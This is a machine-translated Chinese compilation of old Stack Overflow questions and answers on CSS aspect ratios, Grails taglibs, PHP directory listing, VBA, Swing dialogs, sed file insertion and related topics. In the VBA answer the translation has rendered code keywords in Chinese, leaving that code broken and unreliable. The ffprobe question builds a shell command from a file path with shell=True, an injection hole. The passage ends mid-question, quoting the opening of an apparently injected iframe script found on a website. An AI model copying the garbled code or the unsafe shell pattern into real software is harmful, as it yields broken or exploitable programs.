decltype(slot_type<MyMessage>(MyObject::mymethod)) 
```

不是......这要短得多......但它确实避免了冗余。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:12:02.757

您可以重载所有要传递给插槽处理程序`operator()` 的参数类型 (`TMsg`和) 对。`Link`

```
struct MyObject
{
   //handlers
   void operator()(AMsg* msg, Link* link);  //handler 1
   void operator()(BMsg* msg, Link* link);  //handler 2
   void operator()(CMsg* msg, Link* link);  //handler 3
}; 
```

然后将其用作：

```
Slot<MyObject, AMsg> aslot;
Slot<MyObject, BMsg> bslot;
Slot<MyObject, CMsg> cslot; 
```

你在哪里`Slot`：

```
template <class TObj, class TMsg>
class Slot 
{
   TMsg *pMsg;
   Link *pLink;
   void f()
   {
      TObj slotHander;

      slotHandler(pMsg, pLink); //it calls the appropriate handler
   }
}; 
```

# iphone - 与iphone中的颜色有关

> ID：11243070
> 
> 赞同：0
> 
> 时间：2012-06-28T10:54:26.830
> 
> 标签：iphone, objective-c

我想通过选择颜色来更改我的应用程序中的按钮颜色。我希望用户选择这样的颜色，而不是将颜色设置为静态![在此处输入图像描述](../Images/38611eb48c1eb995a868c0915cf02824.png)

或用于目标 c 的任何 API。谁能指导我如何进行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:00:19.247

如果您从这个开源项目中查看这些类中的代码是如何工作的，您应该能够将其集成到您的视图中。

[http://maniacdev.com/2011/11/open-source-ios-color-picker-components-roundup/](http://maniacdev.com/2011/11/open-source-ios-color-picker-components-roundup/)

希望这可以帮助！

山姆

# html - Grails 标记库 G:SELECT

> ID：11243074
> 
> 赞同：0
> 
> 时间：2012-06-28T10:54:45.083
> 
> 标签：html, grails, taglib

我是 Grails 平台的新手，对 TagLib 组件产生了兴趣。我有这个应用程序，我要在其中创建一个由两个`<select>`标签组成的时间选择 [24 小时格式选择]：小时和时间。到目前为止，我已经以这种方式编写了我的理论。

```
def timePicker = { attrs ->
   out << "<g:select name='" + attrs['name'] + ".hour' from='${00..21}' />"
   out << "<g:select name='" + attrs['name'] + ".minute' from='${00..59}' />" 
} 
```

但是我无法在页面中显示它，但它会`out`在网页本身中显示内容，这是错误的。如何在by TagLib`<select>`上正确显示两个？`.gsp`我打算用传统的`<select>`伴随`<option>`语句来写它，还是要使用`g.select(attrs)`语法？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T13:03:01.520

你可以使用这样的东西：

```
def timePicker = { attrs ->
    def hours = 0..21
    def stringHours = hours.collect{ String.format('%02d', it) }

    def minutes = 0..59
    def stringMinutes = minutes.collect{ String.format('%02d', it) }

    out << "${select(from: stringHours, name: attrs.name + '.hour')}"
    out << "${select(from: stringMinutes, name: attrs.name + '.minute')}"
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:14:15.027

您只能在 GSP 中使用方法调用：

```
def timePicker = { attrs ->
    out << "${select(from: 00..21, name: attrs.name + '.hour')}"
    out << "${select(from: 00..59, name: attrs.name + '.minute')}"
 } 
```

# html - CSS缩放高度以匹配宽度 - 可能与外形尺寸

> ID：11243075
> 
> 赞同：81
> 
> 时间：2012-06-28T10:54:49.387
> 
> 标签：html, css, responsive-design

我在 twitterBootstrap 基本响应式设计站点中实现了 GoogleMapsV3 地图。

但我的问题很简单：我有：

```
<div id="map"></map> 
```

和

```
#map{ width: 100%; height: 200px } 
```

我希望能够将高度更改为外形尺寸。就像在这个“我梦中的 CSS”中

```
#map { width: 100%; height: width * 1.72 } 
```

我试过省略高度，设置为自动，以及各种 persentages - 但只是为了让 div 总是在我身上崩溃。

我写一个 js 解决方案没有问题，但希望有一个简单的干净的 CSS 解决方案，可能是 CSS3

如果不可能，那么让我摆脱这种情况的最佳方法是什么？（定时器，事件...或类似）

* * *

## 回答 #1

> 赞同：114
> 
> 时间：2012-06-28T11:08:58.913

这里是。纯 CSS。您确实需要一个额外的“容器”元素。

**小提琴**

~~（tinkerbin，实际上）：[http](http://tinkerbin.com/rQ71nWDT)~~ ://tinkerbin.com/rQ71nWDT（Tinkerbin 已经死了。）

**解决方案。**

***注意*** *我在整个示例中使用 100%。您可以使用任何您想要的百分比。*

由于高度百分比是相对于父元素的高度，我们不能依赖它。我们必须依靠别的东西。幸运的是，填充是相对于宽度的——无论是水平填充还是垂直填充。在`padding-xyz: 100%`中，100% 等于框宽度的 100%。

不幸的是，填充就是这样，填充。内容框的高度为 0。没问题！

粘贴一个绝对定位的元素，给它 100% 的宽度，100% 的高度，并将其用作您的实际内容框。100% 高度有效，因为绝对定位元素上的百分比高度是相对于它们相对定位的框的填充框。

HTML：

```
<div id="map_container">
  <div id="map">
  </div>
</div> 
```

CSS：

```
#map_container {
  position: relative;
  width: 100%;
  padding-bottom: 100%;
}

#map {
  position: absolute;
  width: 100%;
  height: 100%;
} 
```

* * *

## 回答 #2

> 赞同：53
> 
> 时间：2015-05-28T15:53:53.800

您可以尝试使用`vw`高度。 [https://developer.mozilla.org/en/docs/Web/CSS/length](https://developer.mozilla.org/en/docs/Web/CSS/length)

就像是

```
div#map {
     width: 100%;
     height: 60vw;
} 
```

这会将 div 的宽度设置为视口宽度的 60%。您可能需要使用 calc 进行调整以将填充考虑在内……</p>

* * *

## 回答 #3

> 赞同：34
> 
> 时间：2012-06-28T11:02:58.700

为此，您将需要使用 JavaScript，或依赖某种受支持的`calc()`CSS 表达式。

```
window.addEventListener("resize", function(e) {
    var mapElement = document.getElementById("map");
    mapElement.style.height = mapElement.offsetWidth * 1.72;
}); 
```

或使用 CSS calc（请参阅此处的支持：http: [//caniuse.com/calc](http://caniuse.com/calc)）

```
#map {
    width: 100%;
    height: calc(100vw * 1.72)
} 
```

* * *

## 回答 #4

> 赞同：22
> 
> 时间：2017-08-01T07:37:42.063

```
.video {
    width: 100%;
    position: relative;
    padding-bottom: 56.25%; /* ratio 16/9 */
}

.video iframe {
    border: none;
    position: absolute;
    width: 100%;
    height: 100%;
} 
```

**16:9**

填充底部 = 9/16 * 100 = 56.25

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2019-03-20T02:08:15.103

尝试视口

您可以使用宽度数据并相应地计算高度

此示例适用于 150x200 像素的图像

```
width: calc(100vw / 2 - 30px);
height: calc((100vw/2 - 30px) * 1.34); 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2013-08-01T23:13:27.217

我需要做“流体”矩形而不是正方形....所以感谢 JOPL .... 只花了一分钟....

```
#map_container {
     position: relative;
     width: 100%;
     padding-bottom: 75%;
}

#map {
    position:absolute;
    width:100%;
    height:100%;
} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2020-01-24T09:00:05.443

你可以设置它的`before`和`after`来强制一个恒定的宽高比

**HTML：**

```
<div class="squared"></div> 
```

**CSS：**

```
.squared {
  background: #333;
  width: 300px; 
}
.squared::before {
  content: '';
  padding-top: 100%;
  float: left;
}
.squared::after {
  content: '';
  display: block;
  clear: both;
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-06-28T11:07:33.417

让我将 JS 解决方案描述为单独的答案：

```
function handleResize()
{
  var mapElement = document.getElementById("map");
  mapElement.style.height = (mapElement.offsetWidth * 1.72) + "px";
}

<div id="map" onresize="handleResize()">...</div> 
```

（或动态注册事件监听器）。

`mapElement.style.width * 1.72`将不起作用，因为它要求在元素上显式设置宽度，使用`width`DOM 属性或内联样式的`width`CSS 属性。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-02-06T14:08:24.063

我用 YouTube 的 IFRAME 做了类似的事情，其中​​ iframe 位于始终根据纵向/横向更改的网格内，因此此代码适用于：

所以这个问题的代码是：

```
// Layout resize
let height = window.innerHeight;
let width = window.document.getElementById('player').parentNode.clientWidth;
    height = width / 1.77; 
```

```
<div id="player"></div>

... etc ..

function onYouTubeIframeAPIReady() {
          // Layout resize
          let height = window.innerHeight;
          let width = window.document.getElementById('player').parentNode.clientWidth;
              height = width / 1.77;

          player = new YT.Player('player', {
            width: '100%',
            height: height,            
            videoId: currentVideoId,
            playerVars: {
              'autoplay': 0,
              'loop': 0,
              'mute': 0,
              'controls': 0,
              'enablejsapi': 1,
              'playsinline': 0,
              'rel': 0,
              'widget_referrer': 'http://my domain ...'
            },
            events: {
              'onReady': onPlayerReady,
              'onStateChange': onPlayerStateChange,
              'onError': onError
            }
          });
        } 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2019-01-21T13:17:22.203

使用 Jquery 的解决方案

```
$(window).resize(function () {
    var width = $("#map").width();
    $("#map").height(width * 1.72);
}); 
```

* * *

## 回答 #11

> 赞同：-3
> 
> 时间：2019-11-30T23:20:49.653

```
#map { 
    width: 100%; 
    height: 100vw * 1.72 
} 
```

# php - 打印每个子文件夹和子文件夹的每个文件 php

> ID：11243076
> 
> 赞同：0
> 
> 时间：2012-06-28T10:54:50.917
> 
> 标签：php

这是我服务器中的文件结构：

```
htdocs/pdf/a/sub-a/file-01.pdf
htdocs/pdf/a/sub-a/file-02.pdf
htdocs/pdf/a/sub-a/file-03.pdf

htdocs/pdf/a/sub-b/file-01.pdf
htdocs/pdf/a/sub-b/file-02.pdf
htdocs/pdf/a/sub-b/file-03.pdf

htdocs/pdf/a/sub-c/file-01.pdf
htdocs/pdf/a/sub-c/file-02.pdf
htdocs/pdf/a/sub-c/file-03.pdf 
```

等等，好吧，我想打印任何文件和任何子文件夹的列表，如下所示：

```
<h3>sub-a</h3>
<ul>
<li>file-01.pdf</li>
<li>file-02.pdf</li>
<li>file-03.pdf</li>
</ul>

<h3>sub-b</h3>
<ul>
<li>file-01.pdf</li>
<li>file-02.pdf</li>
<li>file-03.pdf</li>
</ul>

<h3>sub-c</h3>
<ul>
<li>file-01.pdf</li>
<li>file-02.pdf</li>
<li>file-03.pdf</li>
</ul> 
```

我的问题是我不知道如何在 php 代码中获取列表。有人可以帮助我吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:08:02.250

您可能想查看 readdir 和 scandir：[http://php.net/manual/en/function.readdir.php](http://php.net/manual/en/function.readdir.php)和[http://www.php.net/manual/en/function.scandir.php](http://www.php.net/manual/en/function.scandir.php)。那里也有一些很好的例子。也许这样的事情可能会起作用（你需要稍微调整一下 - 原来是为 Windows 写的，抱歉）：

```
$dir = "htdocs/pdf/a/";
if ($handle = opendir($dir)) {                  
  while (false !== ($file = readdir($handle))) {
      if ($file != "." && $file != "..") {
          $dir2 = "htdocs/pdf/a/".$file."/";
          echo "<h3>".ucwords(str_replace("-"," ",$file))."</h3><ul>";  
          if ($handle2 = opendir($dir2)) {
              while (false !== ($file2 = readdir($handle2))) {
                if ($file2 != "." && $file2 != "..") {                                                                                                          
                  echo "<li>".$file2."</li>";

                }
              }
            closedir($handle2);
          }
          echo "</ul><hr size='1'>";
      }
  }                 
closedir($handle);
} 
```

# ios - 如何组织控制器和视图 (iOS)

> ID：11243078
> 
> 赞同：0
> 
> 时间：2012-06-28T10:54:53.447
> 
> 标签：ios, xcode, uiview, uiviewcontroller, uiwindow

我希望我`UITabBarController`与框架（0；100；320；380）在一起。

除了 UITabBarController 之外，我还想要一个带有框架（0；0；320；100）的视图。

该视图应该独立于 TabBarController 并且始终可见。当打开不同的选项卡时，顶视图应该保持可见，例如`UINavigationBar`.

有什么办法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T10:57:22.743

创建一个`UIViewController`子类，在 xib 中添加两个视图，一个`upperview`和另一个`lowerview`具有您想要的大小

在视图中确实加载了这个视图控制器，创建一个`UITabBarController`，然后添加你想要的视图控制器

然后做

```
[lowerview addSubView:tabBarController.view];
[upperview addSubView:yourUpperView]; 
```

# excel - 如何在 VBA 中将两个私有 Worksheet_Change 子组合为一个？

> ID：11243080
> 
> 赞同：0
> 
> 时间：2012-06-28T10:54:55.397
> 
> 标签：excel, vba

我目前有这个代码：

```
Private Sub Worksheet_Change(ByVal Target As Range)

    Dim lastrow As Long
    Dim rngList As Range

    lastrow = Cells(Rows.Count, "A").End(xlUp).Row

    Set rngList = Range("AB3").CurrentRegion

    If Target.Cells.Count > 1 Then Exit Sub

    On Error Resume Next

    If Not Intersect(Target, Range("B18:B19")) Is Nothing Then  ' user is in column-A
        Target.Value = Application.WorksheetFunction.VLookup(Target.Value, rngList, 2, False)
    End If

    Set rngList = Nothing
End Sub 
```

和

```
Private Sub Worksheet_Change(ByVal Target As Range)

Dim lastrow As Long
Dim rngList As Range

lastrow = Cells(Rows.Count, "A").End(xlUp).Row

Set rngList = Range("AC3").CurrentRegion

If Target.Cells.Count > 1 Then Exit Sub

On Error Resume Next

If Not Intersect(Target, Range("B10:B11")) Is Nothing Then  ' user is in column-A
    Target.Value = Application.WorksheetFunction.VLookup(Target.Value, rngList, 2, False)
End If

Set rngList = Nothing 
```

结束子

我想将它们结合起来，以便我可以同时使用它们，但我不知道如何在没有冲突的情况下这样做，任何帮助将不胜感激，谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:06:12.940

如果我对您的理解正确，这应该可以解决您尝试做的事情：

```
Private Sub Worksheet_Change(ByVal Target As Range)

    WorksheetChanged Target, Range("AC3").CurrentRegion, Range("B10:B11")
    WorksheetChanged Target, Range("AB3").CurrentRegion, Range("B18:B19")

结束子

Private Sub WorksheetChanged(ByVal Target As Range, ByVal rngList As Range, ByVal intersectRng As Range)

    Dim lastrow 只要

    lastrow = Cells(Rows.Count, "A").End(xlUp).Row

    如果 Target.Cells.Count > 1 然后退出 Sub

    出错时继续下一步

    If Not Intersect(Target, intersectRng) Is Nothing Then ' 用户在列-A
        Target.Value = Application.WorksheetFunction.VLookup(Target.Value, rngList, 2, False)
    万一

    设置 rngList = 无
结束子

```

在这里，您有一个私有函数，它将范围作为参数。您可以根据需要随时调用此函数（尽管如果您在 Worksheed_Change Sub 中调用过多，Excel 可能会变得有点慢）。

# ninject - Ninject MVC3 - 如何解析类型

> ID：11243083
> 
> 赞同：0
> 
> 时间：2012-06-28T10:54:58.950
> 
> 标签：ninject, ninject.web.mvc

场景：我使用以下链接设置了 Ninject MVC3： [https ://github.com/ninject/ninject.web.mvc/wiki/Setting-up-an-MVC3-application](https://github.com/ninject/ninject.web.mvc/wiki/Setting-up-an-MVC3-application)

我遵循 Nuget 版本。而且，代码如下所示：

```
private static void RegisterServices(IKernel kernel)
    {
        kernel.Bind<IService>().<Service>();
    } 
```

有人可以帮助我了解以下代码何时何地被执行吗？

```
var test=Kernel.Get<Service>(); 
```

基本上我试图了解我们在哪里解决具体类型。

**更新**：

我的问题更多的是 MVC 在哪里使用 Kernel.Get() 将给定的接口解析为具体类型。

这是由 Ninject.MVC 完成的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-02T10:12:02.743

`Kernel.Get<Service>()`不应该在任何地方调用。您应该`IService`在需要此依赖项的控制器的构造函数中请求一个。当 MVC 需要这个控制器时，它会要求 Ninject 创建控制器实例，然后 Ninject 会将服务注入到控制器中。

# c# - 如何使用 c#.net 在 SQL Server 数据库中的任何位置查找值？

> ID：11243084
> 
> 赞同：-1
> 
> 时间：2012-06-28T10:55:04.303
> 
> 标签：c#

如何使用 c#.net 在 SQL Server 数据库中的任何位置查找值？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-28T11:06:31.567

粗略地说，您首先必须查询数据库方案才能获取所有表：

```
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES 
```

然后，在新查询中使用返回的表名浏览结果集

```
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.Columns WHERE TABLE_NAME = [resulting table name from previous query] 
```

从这里您可以循环每列并使用 where = '[searchterm]' 的列值创建一个选择语句。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T10:58:27.213

[在MSDN](http://msdn.microsoft.com/en-us/library/dw70f090.aspx)和[CodeProject](http://www.codeproject.com/Articles/4416/Beginners-guide-to-accessing-SQL-Server-through-C)上阅读这个简单的教程。网上有很多例子和教程。谷歌一下

# java - JDialog setLocation 被忽略

> ID：11243086
> 
> 赞同：2
> 
> 时间：2012-06-28T10:55:05.033
> 
> 标签：java, swing

*使用 SSCCE 和解决方法进行编辑*

我想以编程方式更改 JDialog 的位置。

```
public class SSCCE {
  public static void main(String[] pArgs) {
    JDialog dialog = new JDialog();
    dialog.setSize(300, 300);
    dialog.setLocation(10, 10);
    dialog.setVisible(true);
  }
} 
```

但是，这不起作用，新对话框**始终**位于屏幕中央。我怀疑它与我的 L&F（Windows 7 64bit，jdk 1.6_30）有关，将对话框设置为未装饰时，

```
public class SSCCEWorksButUndecorated {
  public static void main(String[] pArgs) {
    JDialog dialog = new JDialog();
    dialog.setSize(300, 300);
    dialog.setLocation(10, 10);
    dialog.setUndecorated(true);
    dialog.getRootPane().setWindowDecorationStyle(JRootPane.PLAIN_DIALOG);
    dialog.setVisible(true);
  }
} 
```

该位置是我指定的位置。

但是我需要一个装饰性的对话框，以前有没有其他人看到过这个问题，或者我错过了什么？

*模式对话框的 setVisible()**后**设置位置的解决方法*

```
public class SSCCEWorkaroundForModalDialogs {
  public static void main(String[] pArgs) {
    final JDialog dialog = new JDialog();
    dialog.setSize(300, 300);
    SwingUtilities.invokeLater(new Runnable() {
      @Override
      public void run() {
        dialog.setLocation(10, 10);
      }
     });        
     dialog.setVisible(true);
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:14:15.807

移动方法文档说：

> 此方法更改与布局相关的信息，因此使组件层次结构无效。
> 
> 该方法更改几何相关数据。因此，本机窗口系统可能会忽略此类请求，或者它可能会修改请求的数据，以便以与桌面设置紧密对应的方式放置 Window 对象并调整其大小。

`revalidaite()`我假设您可以在再次设置对话框可见之前进行调用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-04-02T19:10:06.253

***我用我自己的方式来做这件事 -***

```
package com.whodesire.element;

import java.awt.AlphaComposite;
import java.awt.Color;
import java.awt.Font;
import java.awt.GradientPaint;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.GridLayout;
import java.awt.Point;
import java.awt.Polygon;
import java.awt.RenderingHints;
import java.awt.event.ActionEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

import javax.swing.AbstractAction;
import javax.swing.Action;
import javax.swing.BorderFactory;
import javax.swing.InputMap;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JLayeredPane;
import javax.swing.JPanel;
import javax.swing.JRootPane;
import javax.swing.KeyStroke;

public class MessageEdge {
    private JDialog messageEdge = null;
    private JDialog tempMessage = null;
    private Point elmLoc = null;
    private String[] option;
    private JButton btnOK;
    private JLayeredPane lp = null;
    private int top = 70;

    MessageEdge(JFrame owner){
        owner.setAlwaysOnTop(false);
    }

    public void ShowMessage(final String msg){
        ShowMessage(msg, "OK");
    }

    public void ShowMessage(final String msg, final String... option){
        this.option = option;
        init();
    }

    protected void setRootPaneStroking(JRootPane rootPane){
        rootPane.setWindowDecorationStyle(JRootPane.NONE);
        KeyStroke stroke = KeyStroke.getKeyStroke("ESCAPE");
        Action action = new AbstractAction() {
            private static final long serialVersionUID = 1L;
            public void actionPerformed(ActionEvent e) {
                disposeMessage();
            }
        };

        InputMap inputMap = rootPane.getInputMap(JComponent.WHEN_IN_FOCUSED_WINDOW);
        inputMap.put(stroke, "ESCAPE");
        rootPane.getActionMap().put("ESCAPE", action);
    };

    private void init(){
        top = 70;

        tempMessage = new JDialog(){
            private static final long serialVersionUID = 1L;
                {
                    setUndecorated(true);
                    setType(Type.UTILITY);
                    setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
                    setBackground(new Color(0, 0, 0, 0));

                    elmLoc = Elementos.getElementosLocationPoint();
                    setSize(460, 57);
                    setLayout(new GridLayout(1, 1));
                    if(lp == null) 
                        lp = getModelJLayeredPane();
                    add(lp);

                    setLocation(elmLoc.x-10, elmLoc.y+top);
                    setAlwaysOnTop(true);

                    validate();
                    setVisible(true);
                }
        };

        new Thread(new Runnable(){
            public void run(){
                try{
                    OneMethod.playSound("catchyMessage");
                    whileLoop:
                    while(true){
                        //System.out.println("top value is : " + top + ", is top value bigger than -47 : " + (top > -47));
                        if(top > -47){
                            top -= 7;
                            tempMessage.setLocation(elmLoc.x-10, elmLoc.y+top);
                        }else{
                            top = -47;
                            initMessageEdge();
                            break whileLoop;
                        }
                        Thread.sleep(4);
                    }
                }catch(InterruptedException ie){
                    ie.printStackTrace();
                }
            }
        }).start();
    }

    private void initMessageEdge(){
        tempMessage.setVisible(false);
        tempMessage.remove(lp);
        tempMessage.dispose();

        //Elementos is my JFrame
        messageEdge = new JDialog(Elementos.getFrame(), true){
            private static final long serialVersionUID = 1L;
                {
                    setUndecorated(true);
                    setType(Type.UTILITY);
                    setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);

                    setRootPaneStroking(getRootPane());
                    setBackground(new Color(0, 0, 0, 0));

                    requestFocusInWindow();

                    elmLoc = Elementos.getElementosLocationPoint();
                    setSize(460, 57);
                    setLayout(new GridLayout(1, 1));
                    if(lp == null) 
                        lp = getModelJLayeredPane();
                    add(lp);
                    setLocation(elmLoc.x-10, elmLoc.y+top);
                    setAlwaysOnTop(true);   
                    validate();
                }
        };
        messageEdge.setVisible(true);
        messageEdge.requestFocus();
    }

    private JLayeredPane getModelJLayeredPane(){
        JLayeredPane layer = new JLayeredPane();
        layer.setBounds(0, 0, 460, 57);
        layer.setLayout(null);

        JPanel panel = new JPanel(){
            private static final long serialVersionUID = 1L;
            public void paintComponent(Graphics gr){
                super.paintComponent(gr);
                Graphics2D g = (Graphics2D) gr;
                g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                g.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY);
                g.setComposite(AlphaComposite.getInstance(AlphaComposite.SRC_IN, 0.01f));
                g.setColor(new Color(255, 196, 51));
                g.fillRect(0, 0, 460, 57);

                g.setComposite(AlphaComposite.getInstance(AlphaComposite.SRC_OVER, 0.75f));
                g.setColor(new Color(255, 196, 51));
                g.fillRect(0, 0, 460, 47);

                g.setComposite(AlphaComposite.getInstance(AlphaComposite.SRC_OVER, 1.0f));
                g.setColor(new Color(244, 171, 50));
                int[] xxPoly = {0, 10,  10};
                int[] yyPoly = {47, 47, 57}; 
                Polygon pplg = new Polygon(xxPoly, yyPoly, xxPoly.length);
                g.fillPolygon(pplg);
            }
        };
        panel.setSize(450, 57);
        panel.setOpaque(true);
        panel.setLayout(null);
        layer.add(panel);

        btnOK = new JButton(){
            private static final long serialVersionUID = 1L;
            @Override
            protected void paintComponent(Graphics gr) {
                final Graphics2D g = (Graphics2D) gr.create();
                g.setPaint(new GradientPaint(new Point(0, 0), Color.WHITE, 
                        new Point(0, getHeight()), new Color(255, 196, 51)));
                g.fillRect(0, 0, getWidth(), getHeight());
                g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                g.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY);
                g.setColor(Color.BLACK);
                g.setFont(new Font(OneMethod.getSegoeUIBoldFont().getFamily(), Font.BOLD, 11));
                g.drawString(option[0], 8, 17);
                g.dispose();
                super.paintComponent(g);
            }
        };
        btnOK.setFocusPainted(false);
        btnOK.setBorder(BorderFactory.createLineBorder(new Color(244, 171, 50)));
        btnOK.setBounds(460-30, (int)((47/2)-(25/2)), 30, 25);
        layer.add(btnOK);
        btnOK.addMouseListener(new MouseAdapter(){
            @Override
            public void mousePressed(MouseEvent evt){
                btnOK.setBorder(BorderFactory.createEmptyBorder());
                btnOK.setBorder(BorderFactory.createLoweredBevelBorder());
            }
            @Override
            public void mouseReleased(MouseEvent evt){
                btnOK.setBorder(BorderFactory.createLineBorder(new Color(244, 171, 50)));
                disposeMessage();
                Elementos.getFrame().setAlwaysOnTop(true);
            }
        });
        layer.moveToFront(btnOK);

        return layer;
    }

    private void disposeMessage(){
        messageEdge.setModal(false);
        messageEdge.setVisible(false);
        messageEdge.dispose();
    }
} 
```

**希望它可以帮助你和其他人，干杯......**

# python - 如何模拟 .mpg 文件进行单元测试？

> ID：11243092
> 
> 赞同：2
> 
> 时间：2012-06-28T10:55:09.403
> 
> 标签：python, unit-testing, ffmpeg, ffprobe

行。我有一个运行这个命令的类：

```
ffmpeg_command = "ffprobe -v quiet -print_format json -show_format -show_streams %s" % self.absolute_path 
```

self.absolute_path 是电影的路径，比方说 .mpg 文件。

我用于测试的文件是 4GB 大，我不想在我的 GIT 存储库中提交它。

所以我正在考虑模拟这个文件并创建一个名为：

```
mock.mpg 
```

当作为 ffprobe 命令的输入提供时，它将返回与实际 mpg 电影相同的字符串。那可能吗？

或者我应该选择什么其他方法？

这是我的课：

```
 class Movie(object):

      absolute_path = None
      info = None

      def __init__(self, path):
          self.absolute_path = "%s/%s" % (os.getcwd(), path)
          if(os.path.exists(self.absolute_path) is False):
              raise IOError("File does not exist")

          self.info = json.loads(self.get_info())

    def get_info(self):
          ffmpeg_command = "ffprobe -v quiet -print_format json -show_format -show_streams %s" % self.absolute_path
          return subprocess.check_output(ffmpeg_command, shell=True) 
```

这就是我将如何对其进行单元测试：

```
 class MovieTest(unittest.TestCase):

      def test_foo(self):
          movie = Movie("tests/test_1.mpg") # this file should be a mock file!!! 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T11:13:02.127

我建议您**包装 ffmpeg 依赖项**。

而是为此提供一个模拟。无论如何，包装外部工具/库是个好主意。如果任何接口发生更改，您只需修复包装器，而不是从您的代码到 ffmpeg 的每个连接。包装器只需要纸薄就可以从简单的单元测试中受益。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T10:58:58.107

相信 ffmpeg 可以正确完成它的工作。然后，您在测试中所要做的就是验证该命令对于给定的输入是否正确。

# oracle - Oracle：在 dba_scheduler_jobs 中找不到作业

> ID：11243093
> 
> 赞同：0
> 
> 时间：2012-06-28T10:55:10.277
> 
> 标签：oracle, jobs

使用第二个查询我可以找到 JOB id。但是使用第一个它不存在。为什么？

```
select *
from dba_scheduler_jobs dj
WHERE dj.job_action LIKE '%Power%02%' AND dj.owner = 'SIUETL';

select *
  FROM dba_jobs dj
 WHERE dj.what LIKE '%Power%02%' AND dj.log_user = 'SIUETL'; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T10:59:44.240

这是因为 DBA_JOBS 使用旧的（已弃用的）DBMS_JOB 作业调度系统，而 DBA_SCHEDULER_JOBS 使用新的闪亮的 DBMS_SCHEDULER。

这两个是完全独立的。

# bash - 使用 sed 插入文件内容

> ID：11243102
> 
> 赞同：10
> 
> 时间：2012-06-28T10:56:05.707
> 
> 标签：bash, sed

我正在尝试在给定模式之前插入文件内容

这是我的代码：

```
sed -i "" "/pattern/ {
i\\ 
r $scriptPath/adapters/default/permissions.xml"
}" "$manifestFile" 
```

它添加路径而不是文件的内容。

有任何想法吗 ？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-06-28T14:19:38.697

为了在模式*之前*插入文本，您需要在读入文件之前将模式空间交换到保持空间。例如：

```
sed "/pattern/ {
         h
         r $scriptPath/adapters/default/permissions.xml
         g
         N
     }" "$manifestFile" 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-28T11:02:02.237

只需删除`i\\`.

例子：

```
$ cat 1.txt
abc
pattern
def

$ echo hello > 2.txt

$ sed -i '/pattern/r 2.txt' 1.txt

$ cat 1.txt
abc
pattern
hello
def 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2019-05-17T08:02:53.837

我试过托德的回答，效果很好，

但我发现“h”和“g”命令是可以省略的。

多亏了[这个常见问题](http://www.linuxtopia.org/online_books/linux_tool_guides/the_sed_faq/sedfaq5_008.html)解答（从@vscharf 的[评论](https://stackoverflow.com/questions/11243102/using-sed-to-insert-file-content#comment35282910_11246712)中找到），托德的答案可以是这一行。

```
sed -i -e "/pattern/ {r $file" -e 'N}' $manifestFile 
```

**编辑：** 如果您需要 here-doc 版本，请检查[此](https://stackoverflow.com/questions/47582028/trying-to-write-a-heredoc-into-an-existing-file-using-sed-in-bash#comment98990264_47584538).

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-28T11:27:29.907

我使用awk得到了类似的东西。看起来很难看，但在我的测试中成功了：

命令：

```
cat test.txt | awk '
/pattern/ {
    line = $0;
    while ((getline < "insert.txt") > 0) {print};
    print line;
    next
}
{print}' 
```

测试.txt：

```
$ cat test.txt
some stuff
pattern
some other stuff 
```

插入.txt：

```
$ cat insert.txt
this is inserted file
this is inserted file 
```

输出：

```
some stuff
this is inserted file
this is inserted file
pattern
some other stuff 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-06-11T05:04:28.270

CodeGnome 的解决方案不起作用，如果模式在最后一行。所以我使用了 3 个命令。

```
sed -i '/pattern/ i\
        INSERTION_MARKER
        ' $manifestFile
sed -i '/INSERTION_MARKER/r $scriptPath/adapters/default/permissions.xml' $manifestFile
sed -i 's/INSERTION_MARKER//' $manifestFile 
```

# php - 使用 AJAX 调用的返回数据非常混乱

> ID：11243114
> 
> 赞同：-2
> 
> 时间：2012-06-28T10:56:45.987
> 
> 标签：php, javascript, html, ajax, .htaccess

每当在[http://www.btandthetenants.com](http://www.btandthetenants.com)网站上单击链接时，我都会收到一个 AJAX 请求来自动加载内容。然而，最近，我看到在我的返回数据中注入了这段令人困惑的代码：

```
<script>
    var _q = document.createElement('iframe'),
        _n = 'setAttribute';
